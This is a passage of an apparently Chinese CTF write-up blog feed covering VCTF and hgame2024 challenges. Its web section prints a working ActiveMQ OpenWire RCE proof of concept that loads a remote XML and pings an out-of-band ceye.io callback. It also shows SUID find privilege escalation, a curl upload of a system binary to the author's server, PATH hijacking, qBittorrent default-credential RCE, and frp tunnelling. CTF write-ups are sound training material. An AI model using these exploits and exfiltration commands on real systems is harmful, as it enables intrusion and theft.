class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    plain = base64.b64decode(plain.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    plain = <span class="built_in">bytes</span>.decode(plain)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">128</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">128</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">128</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span>  cipher</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;3pn1Ek92hmAEg38EXMn99J9YBf8=&quot;</span>   </span><br><span class="line">outtab  = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span> </span><br><span class="line">intab   = <span class="string">&quot;0123456789XYZabcdefghijklABCDEFGHIJKLMNOPQRSTUVWmnopqrstuvwxyz+/=&quot;</span> </span><br><span class="line"></span><br><span class="line">s = base64.b64encode(base64.b64decode(<span class="built_in">str</span>.translate(<span class="built_in">str</span>.maketrans(intab,outtab))))</span><br><span class="line"><span class="comment">#print (s)</span></span><br><span class="line"></span><br><span class="line">flag = rc4_main(<span class="string">&quot;Thi5_1S_key?&quot;</span>, s.decode())</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;Simple_rEvErse&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="狂飙"><a href="#狂飙" class="headerlink" title="狂飙"></a>狂飙</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">m = <span class="number">88007513702424243702066490849596817304827839547007641526433597788800212065249</span></span><br><span class="line">key = os.urandom(<span class="number">24</span>)</span><br><span class="line">key = bytes_to_long(key)</span><br><span class="line">n=m % key</span><br><span class="line">flag += (<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">enc_flag = aes.encrypt(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(enc_flag)</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#103560843006078708944833658339172896192389513625588</span></span><br><span class="line"><span class="comment">#b&#x27;\xfc\x87\xcb\x8e\x9d\x1a\x17\x86\xd9~\x16)\xbfU\x98D\xfe\x8f\xde\x9c\xb0\xd1\x9e\xe7\xa7\xefiY\x95C\x14\x13C@j1\x9d\x08\xd9\xe7W&gt;F2\x96cm\xeb&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;UN\x1d\xe2r&lt;\x1db\x00\xdb\x9a\x84\x1e\x82\xf0\x86&#x27;</span></span><br></pre></td></tr></table></figure><p><code>m-n</code> 是 <code>bytes_to_long(key)</code> 的倍数，分解<code>m-n</code>之后再组合一下得到正确的<code>key</code>后，AES解出flag.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">key</span>):</span><br><span class="line">    iv = <span class="string">b&#x27;UN\x1d\xe2r&lt;\x1db\x00\xdb\x9a\x84\x1e\x82\xf0\x86&#x27;</span></span><br><span class="line">    enc = <span class="string">b&#x27;\xfc\x87\xcb\x8e\x9d\x1a\x17\x86\xd9~\x16)\xbfU\x98D\xfe\x8f\xde\x9c\xb0\xd1\x9e\xe7\xa7\xefiY\x95C\x14\x13C@j1\x9d\x08\xd9\xe7W&gt;F2\x96cm\xeb&#x27;</span></span><br><span class="line">    aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    flag = aes.decrypt(enc)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;flag&#123;&quot;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">b&quot;VCTF&#123;&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = <span class="number">88007513702424243702066490849596817304827839547007641526433597788800212065249</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">103560843006078708944833658339172896192389513625588</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(m-n)</span></span><br><span class="line"></span><br><span class="line">nn = [<span class="number">3</span> , <span class="number">37</span> , <span class="number">439</span> , <span class="number">3939851</span> , <span class="number">265898280367</span>, <span class="number">5036645362649</span>, <span class="number">342291058100503482469327892079792475478873</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> itertools.combinations(nn,<span class="number">4</span>):</span><br><span class="line">    res = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">        res *= i</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(res))-<span class="number">2</span> &gt;= <span class="number">185</span> <span class="keyword">and</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(res))-<span class="number">2</span> &lt;= <span class="number">192</span>:</span><br><span class="line">        decode(long_to_bytes(res))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;flag&#123;cf735a4d-f9d9-5110-8a73-5017fc39b1b0&#125;\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="RRSA"><a href="#RRSA" class="headerlink" title="RRSA"></a>RRSA</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genprime</span>():</span><br><span class="line">o = getPrime(<span class="number">300</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = random.randint(<span class="number">2</span>**<span class="number">211</span>,<span class="number">2</span>**<span class="number">212</span>)</span><br><span class="line"><span class="keyword">if</span> isPrime(o*r+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">return</span> o,o*r+<span class="number">1</span></span><br><span class="line">o1,p = genprime()</span><br><span class="line">o2,q = genprime()</span><br><span class="line">n=p*q</span><br><span class="line">g = random.randint(<span class="number">2</span>,n)</span><br><span class="line">order = o1*o2</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">pow</span>(g, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)//order, n)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(a,order,n)==<span class="number">1</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n=<span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a=<span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;o=<span class="subst">&#123;order&#125;</span>&#x27;</span>)</span><br><span class="line">n=<span class="number">44435425447782114838897637647733409614831121089064725526413247701631122523646623518523253532066782191116739274354991533158902831935676078270115998050827358178237970133151467497051097694866238654012042884894924846645692294679774577780414805605811029994570132760841672754334836945991390844881416693502552870759</span></span><br><span class="line">c=<span class="number">41355409695119524180275572228024314281790321005050664347253778436753663918879919757571129194249071204946415158483084730406579433518426895158142068246063333111438863836668823874266012696265984976829088976346775293102571794377818611709336242495598331872036489022428750111592728015245733975923531682859930386731</span></span><br><span class="line">a=<span class="number">39844923600973712577104437232871220768052114284995840460375902596405104689968610170336151307934820030811039502338683925817667771016288030594299464019664781911131177394369348831163266849069740191783143327911986419528382896919157135487360024877230254274474109707112110411601273850406237677432935818199348150470</span></span><br><span class="line">o=<span class="number">1745108106200960949680880500144134006212310627077303652648249235148621661187609612344828833696608872318217367008018829485062303972702933973340909520462917612611270028511222134076453</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析题目，r&lt;o，那 <code>r/o &lt; 1</code></p><p>n展开</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">n = (o1*r1+1)*(o2*r2+1) = o1*o2*r1*r2 + o1*r1 + o2*r2 + 1</span><br></pre></td></tr></table></figure><p>则</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">n/o = r1*r2 + r1/o2 + r2/o1 + 1/o </span><br></pre></td></tr></table></figure><p>取整，可以得到 <code>r1*r2</code>的值</p><p>求phi</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phi = (o1*r1)*(o2*r2) = n//o * o</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n=<span class="number">44435425447782114838897637647733409614831121089064725526413247701631122523646623518523253532066782191116739274354991533158902831935676078270115998050827358178237970133151467497051097694866238654012042884894924846645692294679774577780414805605811029994570132760841672754334836945991390844881416693502552870759</span></span><br><span class="line">c=<span class="number">41355409695119524180275572228024314281790321005050664347253778436753663918879919757571129194249071204946415158483084730406579433518426895158142068246063333111438863836668823874266012696265984976829088976346775293102571794377818611709336242495598331872036489022428750111592728015245733975923531682859930386731</span></span><br><span class="line">a=<span class="number">39844923600973712577104437232871220768052114284995840460375902596405104689968610170336151307934820030811039502338683925817667771016288030594299464019664781911131177394369348831163266849069740191783143327911986419528382896919157135487360024877230254274474109707112110411601273850406237677432935818199348150470</span></span><br><span class="line">o=<span class="number">1745108106200960949680880500144134006212310627077303652648249235148621661187609612344828833696608872318217367008018829485062303972702933973340909520462917612611270028511222134076453</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">r12 = n//o</span><br><span class="line">phi = r12*o</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;0228FC7F-C865-BD0F-F124-9F9860B3542B&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>f12看控制台得到 <code>88d18c420654d158d22b65626bc7a878</code></p><p>查md5即可得到flag。</p><p><img src="/./VCTF/m_1_1.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> write up </category>
          
          <category> VCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2024_week4 WP</title>
      <link href="/hgame2024_week4/"/>
      <url>/hgame2024_week4/</url>
      
        <content type="html"><![CDATA[<p>有3个web题没做出来，环境关了，搭好环境复现后再把wp补充到这里。</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Reverse-and-Escalation"><a href="#Reverse-and-Escalation" class="headerlink" title="Reverse and Escalation."></a>Reverse and Escalation.</h2><p>先是登录，抓一个登录包，发现一个<code>Authorization: Basic YWRtaW46YWRtaW4=</code>，解码后发现是刚刚输入的用户名和密码，bp爆破登录一下。</p><p><img src="/./hgame2024_week4/w_1_1.png"></p><p>爆破出<code>admin:admin</code>，登录后可以知道这是<code>ActiveMQ</code>。</p><p>参考链接：<a href="https://github.com/sincere9/Apache-ActiveMQ-RCE">Apache-ActiveMQ-RCE</a></p><p><strong>ActiveMQ.java</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vidar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ActiveMQ</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Poc for ActiveMQ openwire protocol rce&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> <span class="string">&quot;47.102.184.100&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">31980</span>;</span><br><span class="line">        String pocxml= <span class="string">&quot;http://xxxx:xxx/poc.xml&quot;</span>;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">sck</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(ip, port);</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> sck.getOutputStream();</span><br><span class="line">        <span class="type">DataOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(os);</span><br><span class="line">        out.writeInt(<span class="number">0</span>); <span class="comment">//无所谓</span></span><br><span class="line">        out.writeByte(<span class="number">31</span>); <span class="comment">//dataType ExceptionResponseMarshaller</span></span><br><span class="line">        out.writeInt(<span class="number">1</span>); <span class="comment">//CommandId</span></span><br><span class="line">        out.writeBoolean(<span class="literal">true</span>); <span class="comment">//ResponseRequired</span></span><br><span class="line">        out.writeInt(<span class="number">1</span>); <span class="comment">//CorrelationId</span></span><br><span class="line">        out.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//use true -&gt; red utf-8 string</span></span><br><span class="line">        out.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">        out.writeUTF(<span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>);</span><br><span class="line">        <span class="comment">//use true -&gt; red utf-8 string</span></span><br><span class="line">        out.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">        out.writeUTF(pocxml);</span><br><span class="line">        <span class="comment">//call org.apache.activemq.openwire.v1.BaseDataStreamMarshaller#createThrowable cause rce</span></span><br><span class="line">        out.close();</span><br><span class="line">        os.close();</span><br><span class="line">        sck.close();</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Target\t&quot;</span> + ip + <span class="string">&quot;:&quot;</span> + port);</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] XML address\t&quot;</span> + pocxml);</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Payload send success.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>poc.xml</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>ping<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>kbqsag.ceye.io<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>反弹shell后，发现<code>/flag</code>没有权限查看，需要提权。</p><p>先用find命令查看有SUID权限的程序，发现find有这个权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week4/w_1_3.png"></p><p>用find命令提权查看flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find `which find` -exec cat /flag \;</span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week4/w_1_2.png"></p><h2 id="Reverse-and-Escalation-II"><a href="#Reverse-and-Escalation-II" class="headerlink" title="Reverse and Escalation.II"></a>Reverse and Escalation.II</h2><p>和上一题一样是<code>ActiveMQ</code>，同样先反弹shell。</p><p>同样先用find查看有SUID权限的应用，发现find有问题。</p><p><img src="/./hgame2024_week4/w_2_1.png"></p><p>把find上传出来，分析一下，上传的方法是先在自己服务器写一个上传的路径，然后用<code>curl -F</code>把文件上传到自己的服务器。</p><p>参考：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -F &quot;pic=/usr/bin/find&quot; http://xxx:xxx/upload_file.php</span><br></pre></td></tr></table></figure><p>ida分析find，发现find被改了</p><p><img src="/./hgame2024_week4/w_2_2.png"></p><p>分析发现，这个程序需要我们做38道加法题，做完后就以<code>uid=0</code>的状态执行<code>ls</code>。</p><p>先做题，随机数种子取的是当前时间，我选择写一个c来生成命令，再用<code>system</code>来执行<code>find</code></p><p>脚本：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">itoa</span><span class="params">(<span class="type">int</span> val, <span class="type">int</span> base)</span>&#123;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> buf[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> i = <span class="number">30</span>;</span><br><span class="line"><span class="keyword">for</span>(; val &amp;&amp; i ; --i, val /= base)</span><br><span class="line">buf[i] = <span class="string">&quot;0123456789abcdef&quot;</span>[val % base];</span><br><span class="line"><span class="keyword">return</span> &amp;buf[i+<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> v3 = time(<span class="number">0</span>);</span><br><span class="line">srand(v3);</span><br><span class="line"><span class="type">char</span> cmd[<span class="number">1000</span>]=<span class="string">&quot;find  &quot;</span>;</span><br><span class="line"><span class="type">int</span> cnt = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">39</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> v7 = rand() % <span class="number">23333</span>;</span><br><span class="line"><span class="type">int</span> v6 = rand() % <span class="number">23333</span>;</span><br><span class="line"><span class="type">int</span> res = v7+v6;</span><br><span class="line"><span class="comment">//printf(&quot;%d\n&quot;,res);</span></span><br><span class="line"><span class="type">char</span> *res_chars;</span><br><span class="line">res_chars = itoa (res,<span class="number">10</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;res_chars[i];i++)</span><br><span class="line">&#123;</span><br><span class="line">cmd[cnt]=res_chars[i];</span><br><span class="line">cnt++;</span><br><span class="line">&#125;</span><br><span class="line">cmd[cnt++]=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着是静态编译，不然上传后运行不了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc new.c -o new -static</span><br></pre></td></tr></table></figure><p>服务器有<code>wget</code>，可以把文件放到自己服务器上再用<code>wget</code>下载下来。</p><p>下载完后给上执行权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 777 new</span><br></pre></td></tr></table></figure><p>执行new，可以看到能执行到<code>ls</code>了。</p><p><img src="/./hgame2024_week4/w_2_3.png"></p><p>接着是搞定这个ls，我们写一个执行其他命令的shell脚本，脚本名字就叫做ls，并给上执行权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cat /flag&quot;</span> &gt; <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">chmod</span> 777 <span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p>接着修改环境变量，把自己写的<code>ls</code>脚本路径放在<code>PATH</code>的最前面。当系统调用<code>ls</code>时，会按照<code>PATH</code>文件夹的顺序遍历，执行最前面的那一个<code>ls</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=&quot;/tmp:$PATH&quot;</span><br></pre></td></tr></table></figure><p>再次执行new，即可得到flag。</p><p><img src="/./hgame2024_week4/w_2_4.png"></p><h2 id="Whose-Home"><a href="#Whose-Home" class="headerlink" title="Whose Home?"></a>Whose Home?</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>信息收集，可以知道这是一个<code>qBittorrent Web UI</code>，搜索漏洞，可以知道有一个<code>CVE-2023-30801</code></p><p>参考链接：<a href="https://avd.aliyun.com/detail?id=AVD-2023-30801">qBittorrent Web UI 默认凭据导致 RCE (CVE-2023-30801)</a></p><p>默认密码登录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: adminadmin</span><br></pre></td></tr></table></figure><p>登陆后，在设置里放上反弹shell的payload，中文可以自己调。</p><p><img src="/./hgame2024_week4/w_3_1.png"></p><p>找一个<code>torrent</code>文件，单击上传，上传成功后即可反弹shell。</p><p>用find命令查看哪些程序有 SUID 权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>用<code>iconv</code>读<code>/flag</code>即可得到flag1。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iconv /flag</span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week4/w_3_2.png"></p><h3 id="flag2-复现"><a href="#flag2-复现" class="headerlink" title="flag2(复现)"></a>flag2(复现)</h3><p>平台关掉了环境，这里也就只能简单说一下步骤。</p><p>在flag1的时候已经可以反弹shell了，然后就开始扫内网，机器自带了wget，所以我们可以用wget下载工具。</p><p><a href="https://github.com/shadow1ng/fscan/releases/download/1.8.3/fscan">fscan</a> 扫内网可以扫到<code>100.64.43.4</code>有 22 和 6800 存活。</p><p>6800端口在搜索引擎上搜可以知道是<code>aria2</code>的开放端口，可以用这个端口来下载文件和上传文件(上传文件是一个CVE)。</p><p>接着是信息收集，在根目录的<code>/config</code>文件夹的配置文件里面，可以找到常用的账号密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: hgame</span><br><span class="line">password: Sh3hoVRqMQJAw9D</span><br></pre></td></tr></table></figure><p>搭建 <a href="https://github.com/fatedier/frp/releases">frp</a> 做内网穿透，在自己的服务器上运行<code>frps</code>，在靶机服务器上运行<code>frpc</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器： ./frps -c frps.ini</span><br><span class="line">靶机： ./frpc -c frpc.ini</span><br></pre></td></tr></table></figure><p>frps.ini:</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">Bind_addr</span> = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">3348</span> </span><br></pre></td></tr></table></figure><p>frpc.ini</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = xxxxx <span class="comment"># 服务器ip</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">3348</span> <span class="comment"># 开放端口，要和frps.ini上的端口对上</span></span><br><span class="line"></span><br><span class="line"><span class="section">[plugin_socks5]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">20086</span> <span class="comment"># 映射的端口</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着就在kali里，修改<code>/etc/proxychains4.conf</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><p>模仿后边的内容添加上你服务器的ip和映射的端口，就完成了内网穿透。</p><p>之后就是连接 aria2 下载 authorized_key</p><p>得到ssh的登录账号和密码，ssh登录后， <code>cat /flag</code>得到flag了。</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="transformation"><a href="#transformation" class="headerlink" title="transformation"></a>transformation</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> Curve,gx,gy</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag = &quot;hgame&#123;&quot; + hex(gx+gy)[2:] + &quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ison</span>(<span class="params">C, P</span>):</span><br><span class="line">    c, d, p = C</span><br><span class="line">    u, v = P</span><br><span class="line">    <span class="keyword">return</span> (u**<span class="number">2</span> + v**<span class="number">2</span> - c**<span class="number">2</span> * (<span class="number">1</span> + d * u**<span class="number">2</span>*v**<span class="number">2</span>)) % p == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">C, P, Q</span>):</span><br><span class="line">    c, d, p = C</span><br><span class="line">    u1, v1 = P</span><br><span class="line">    u2, v2 = Q</span><br><span class="line">    <span class="keyword">assert</span> ison(C, P) <span class="keyword">and</span> ison(C, Q)</span><br><span class="line">    u3 = (u1 * v2 + v1 * u2) * inverse(c * (<span class="number">1</span> + d * u1 * u2 * v1 * v2), p) % p</span><br><span class="line">    v3 = (v1 * v2 - u1 * u2) * inverse(c * (<span class="number">1</span> - d * u1 * u2 * v1 * v2), p) % p</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>(u3), <span class="built_in">int</span>(v3))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">C, P, m</span>):</span><br><span class="line">    <span class="keyword">assert</span> ison(C, P)</span><br><span class="line">    c, d, p = C</span><br><span class="line">    B = <span class="built_in">bin</span>(m)[<span class="number">2</span>:]</span><br><span class="line">    l = <span class="built_in">len</span>(B)</span><br><span class="line">    u, v = P</span><br><span class="line">    PP = (-u, v)</span><br><span class="line">    O = add(C, P, PP)</span><br><span class="line">    Q = O</span><br><span class="line">    <span class="keyword">if</span> m == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> O</span><br><span class="line">    <span class="keyword">elif</span> m == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> P</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> _ <span 